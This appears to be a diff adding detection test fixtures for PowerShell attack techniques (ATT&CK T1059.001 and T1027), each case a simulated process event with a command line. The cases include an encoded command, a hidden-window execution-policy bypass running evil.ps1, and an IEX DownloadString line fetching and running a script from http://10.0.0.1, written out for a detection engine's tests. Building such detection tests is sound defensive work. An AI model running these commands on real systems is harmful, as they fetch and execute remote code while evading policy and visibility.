@@ -1,0 +1,47 @@
+technique: T1059.001
+name: PowerShell
+cases:
+  - name: 编码命令执行（-enc）
+    source: atomic T1059.001
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: powershell.exe
+        file:
+          path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        cmd_line: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+
+  - name: 隐藏窗口 + 绕过策略
+    source: atomic T1059.001
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: powershell.exe
+        file:
+          path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        cmd_line: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File evil.ps1"
+
+  - name: 内存下载执行（IEX DownloadString）
+    source: atomic T1059.001
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: powershell.exe
+        file:
+          path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        cmd_line: "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"
+
+  - name: pwsh FromBase64String 解码
+    technique: T1027
+    source: atomic T1027
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: pwsh.exe
+        file:
+          path: "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+        cmd_line: "pwsh.exe -c [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZWNobyB0ZXN0'))"
